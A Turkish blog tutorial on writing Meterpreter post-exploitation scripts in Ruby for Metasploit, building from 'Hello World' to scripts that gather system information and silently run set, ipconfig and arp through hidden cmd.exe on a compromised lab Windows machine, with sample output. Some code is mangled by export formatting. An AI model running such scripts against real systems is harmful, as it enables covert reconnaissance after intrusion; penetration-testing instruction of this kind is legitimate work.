---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-14T13:49:00Z"
excerpt: Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca
  gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello
  World” ruby kodu yazalım ve helloworld.rb olarak /usr/share/metasploit-framework/scripts/meterpreter klasörüne
  kayıt edelim.
guid: https://www.siberoloji.com/?p=1207
id: 1207
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Meterpreter Script Düzenleme
url: /tr/msf-meterpreter-script-duzenleme/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="script-yazma">Script Yazma 
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve&nbsp;<code>helloworld.rb</code>&nbsp;olarak&nbsp;<code>/usr/share/metasploit-framework/scripts/meterpreter</code>&nbsp;klasörüne kayıt edelim.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# echo “print_status***(*** “Hello World”***)*** ” ***&gt;***  /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Oluşturduğumuz script kodunu meterpreter oturum açık iken çalıştıralım.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run helloworld
***[*** ******* ***]***  Hello World
meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını&nbsp;<code>helloworld.rb</code>&nbsp;dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">print_error***(*** “this is an error!”***)*** 
print_line***(*** “this is a line”***)*** 
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Yukarıdaki satırlar, standart veri girişi ve hata mesajları için kullanıma bir örnek oluşturmaktadır. Oluşturduğumuz kodları çalıştıralım.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run helloworld
***[*** ******* ***]***  Hello World
***[*** -] this is an error!
this is a line
meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="helloworldrb">helloworld.rb 
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Script kod dosyamız en son olarak aşağıdaki gibi olmalıdır.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">print_status("Hello World")
print_error("this is an error!")
print_line("This is a line")
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Şimdi kodumuza bir fonksiyon ekleyelim. Bu fonksiyonda, bir kaç temel bilgi elde edeceğiz ve hata kontrol özelliği ekleyeceğiz. Oluşturacağımız mimarinin yapısı aşağıdaki gibi olacaktır.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> def geninfo***(*** session***)*** 
    begin
    …..
    rescue ::Exception ***=&gt;***  e
    …..
    end
 end
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Bu yapıyı oluşturmak için dosyayı aşağıdaki şekilde düzenlemeniz yeterlidir. Bu düzenlemeleri yaptıktan sonra&nbsp;<code>helloworld.rb</code>&nbsp;dosyamızın içeriği aşağıdaki gibi olacaktır.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> def getinfo***(*** session***)*** 
    begin
       sysnfo ***=***  session.sys.config.sysinfo
       runpriv ***=***  session.sys.config.getuid
       print_status***(*** "Getting system information ..."***)*** 
       print_status***(*** "tThe target machine OS is #{sysnfo['OS']}"***)*** 
       print_status***(*** "tThe computer name is #{'Computer'} "***)*** 
       print_status***(*** "tScript running as #{runpriv}"***)*** 
    rescue ::Exception ***=&gt;***  e
       print_error***(*** "The following error was encountered #{e}"***)*** 
    end
 end
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, değerleri&nbsp;<code>session</code>&nbsp;değişkeninden alan&nbsp;<code>getinfo(session)</code>&nbsp;isimli bir foksiyon tanımladık. Bu session değişkeni, bir takım metodları ihtiva etmektedir.&nbsp;<code>sysnfo = session.sys.config.sysinfo</code>&nbsp;satırı sistem bilgisini getirirken&nbsp;<code>runpriv = session.sys.config.getuid</code>&nbsp;kullanıcı bilgisini elde etmekte kullanılmaktadır. Ayrıca, hata durumlarını yönetici istisna yöneticisi bulunmaktadır.
  

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="helloworld2rb">helloworld2.rb 
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>İlk oluşturduğumuz dosyaya ufak bir ilave yaparak&nbsp;<code>helloworld2.rb</code>&nbsp;dosyası üretelim.&nbsp;<code>helloworld2.rb</code>&nbsp;dosyası, az önce oluşturduğumuz dosyanın sonuna getinfo(client) satırının eklenmiş halidir. Bu satırı ekleyip dosyayı&nbsp;<code>helloworld2.rb</code>&nbsp;olarak kayıt edelim. Dosyanın son hali aşağıdaki gibi olmalıdır.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> def getinfo***(*** session***)*** 
    begin
       sysnfo ***=***  session.sys.config.sysinfo
       runpriv ***=***  session.sys.config.getuid
       print_status***(*** "Getting system information ..."***)*** 
       print_status***(*** "tThe target machine OS is #{sysnfo['OS']}"***)*** 
       print _status***(*** "tThe computer name is #{'Computer'} "***)*** 
       print_status***(*** "tScript running as #{runpriv}"***)*** 
 rescue ::Exception ***=&gt;***  e
       print_error***(*** "The following error was encountered #{e}"***)*** 
    end
 end

 getinfo***(*** client***)*** 
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Şimdi hazırladığımız&nbsp;<code>helloworld2.rb</code>&nbsp;dosyamızı Meterpreter oturumunda çalıştıralım.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter ***&gt;***  run helloworld2
 ***[*** ******* ***]***  Getting system information ...
 ***[*** ******* ***]***      The target machine OS is Windows XP ***(*** Build 2600, Service Pack 3***)*** .
 ***[*** ******* ***]***      The computer name is Computer
 ***[*** ******* ***]***      Script running as WINXPVM01labuser
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Gördüğünüz gibi&nbsp;<code>helloworld2.rb</code>&nbsp;scripti ile bir takım sistem bigilerini ele etmiş olduk.
  

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="helloworld3rb">helloworld3.rb 
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Yukarıda oluşturduğumuz iki örnek kod dosyasından sonra şimdi başka bir örnek scripte bakalım. Bu script dosyasını metin editorü ile oluşturabilirsiniz. İçeriği aşağıdaki gibi olmalıdır.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def list_exec***(*** session,cmdlst***)*** 
    print_status***(*** "Running Command List ..."***)*** 
    r***=*** ''
    session.response_timeout***=*** 120
    cmdlst.each ***do***  |cmd|
       begin
          print_status "running command #{cmd}"
          r ***=***  session.sys.process.execute***(*** "cmd.exe /c #{cmd}", nil, ***{*** 'Hidden' ***=&gt;***  true, 'Channelized' ***=&gt;***  true***})*** 
          ***while*** ***(*** d ***=***  r.channel.read***)*** 
 
             print_status***(*** "t#{d}"***)*** 
          end
          r.channel.close
          r.close
       rescue ::Exception ***=&gt;***  e
          print_error***(*** "Error Running Command #{cmd}: #{e.class} #{e}"***)*** 
       end
    end
 end
 
 commands ***=***  ***[***  "set",
    "ipconfig  /all",
    "arp -a"***]*** 
 
 list_exec***(*** client,commands***)*** 
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Yukarıdaki kodların ne işlemler yaptığına kısaca bakalım. Öncelikle,&nbsp;<code>list_exec</code>&nbsp;isimli bir fonksiyon tanımlanmıştır. Bu fonksiyon,&nbsp;<code>session</code>&nbsp;ve&nbsp;<code>cmdlist</code>&nbsp;isimli iki değişken almaktadır.&nbsp;<code>cmdlist</code>&nbsp;değişkeninin array yöntemiyle bir dizi komutlar olduğu, kodlardan anlaşılmaktadır. Bu komutlar, sırayla değişkenden alınacak&nbsp;<code>cmd.exe</code>&nbsp;üzerinden hedef sistemde çalıştırılacaktır. Sistemin donma ve tepkisiz kalma durumunu önlemek için&nbsp;<code>session.response_timeout=120</code>&nbsp;120 saniye bekleme süresi tanımlanmıştır. Önceki script kodunda olduğu gibi hata kontrol satırı da bulunmaktadır.
  

<!-- wp:paragraph -->
<p><code>cmdlist</code>&nbsp;dizi değişkeni aslında aşağıda gösterilen komutları sırayla çalıştırmaktadır.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> commands ***=***  ***[***  “set”,
    “ipconfig  /all”,
    “arp –a”]
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Komutların sonunda da oluşturduğumuz fonksiyonu çalıştırma satırı&nbsp;<code>list_exec(client,commands)</code>&nbsp;bulunmaktadır.
  

<!-- wp:paragraph -->
<p>Şimdi oluşturduğumuz yeni helloworld3.rb script kodunu Meterpreter oturumu içinde çalıştıralım.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter ***&gt;***  run helloworld3
 ***[*** ******* ***]***  Running Command List ...
 ***[*** ******* ***]***      running command set
 ***[*** ******* ***]***      ALLUSERSPROFILE***=*** C:\Documents and Settings\All Users
 APPDATA***=*** C:\Documents and Settings\P0WN3D\Application Data
 CommonProgramFiles***=*** C:\Program Files\Common Files
 COMPUTERNAME***=*** TARGET
 ComSpec***=*** C:\WINNT\system32\cmd.exe
 HOMEDRIVE***=*** C:
 HOMEPATH***=*** 
 LOGONSERVER***=*** TARGET
 NUMBER_OF_PROCESSORS***=*** 1
 OS***=*** Windows_NT
 Os2LibPath***=*** C:\WINNT\system32\os2dll;
 Path***=*** C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem
 PATHEXT***=*** .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
 PROCESSOR_ARCHITECTURE***=*** x86
 PROCESSOR_IDENTIFIER***=*** x86 Family 6 Model 7 Stepping 6, GenuineIntel
 PROCESSOR_LEVEL***=*** 6
 PROCESSOR_REVISION***=*** 0706
 ProgramFiles***=*** C:\Program Files
 PROMPT***=*** $P$G
 SystemDrive***=*** C:
 SystemRoot***=*** C:\WINNT
 TEMP***=*** C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
 TMP***=*** C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
 USERDOMAIN***=*** TARGET
 USERNAME***=*** P0WN3D
 USERPROFILE***=*** C:\Documents and Settings\P0WN3D
 windir***=*** C:\WINNT
 
 ***[*** ******* ***]***      running command ipconfig  /all
 ***[*** ******* ***]***      
 Windows 2000 IP Configuration
 
 Host Name . . . . . . . . . . . . : target
 Primary DNS Suffix  . . . . . . . : 
 Node Type . . . . . . . . . . . . : Hybrid
 IP Routing Enabled. . . . . . . . : No
 WINS Proxy Enabled. . . . . . . . : No
 DNS Suffix Search List. . . . . . : localdomain
 
 Ethernet adapter Local Area Connection:
 
 Connection-specific DNS Suffix  . : localdomain
 Description . . . . . . . . . . . : VMware Accelerated AMD PCNet Adapter
 Physical Address. . . . . . . . . : 00-0C-29-85-81-55
 DHCP Enabled. . . . . . . . . . . : Yes
 Autoconfiguration Enabled . . . . : Yes
 IP Address. . . . . . . . . . . . : 172.16.104.145
 Subnet Mask . . . . . . . . . . . : 255.255.255.0
 Default Gateway . . . . . . . . . : 172.16.104.2
 DHCP Server . . . . . . . . . . . : 172.16.104.254
 DNS Servers . . . . . . . . . . . : 172.16.104.2
 Primary WINS Server . . . . . . . : 172.16.104.2
 Lease Obtained. . . . . . . . . . : Tuesday, August 25, 2009 10:53:48 PM
 Lease Expires . . . . . . . . . . : Tuesday, August 25, 2009 11:23:48 PM
 
 ***[*** ******* ***]***      running command arp -a
 ***[*** ******* ***]***      
 Interface: 172.16.104.145 on Interface 0x1000003
 Internet Address      Physical Address      Type
 172.16.104.2          00-50-56-eb-db-06     dynamic   
 172.16.104.150        00-0c-29-a7-f1-c5     dynamic   
 
 meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Gördüğünüz gibi, Ruby kodlarıyla script oluşturmak aslında çok kolay. İlk başta kodlar biraz karışık gelebilir ancak mevcut koldarı biraz çalıştığınızda aşinalık kazanacaksınız. Devamında yapmanız gereken, kod örneklerinden faydalanarak kendi script dosyanızı oluşturmak ve denemektir.
  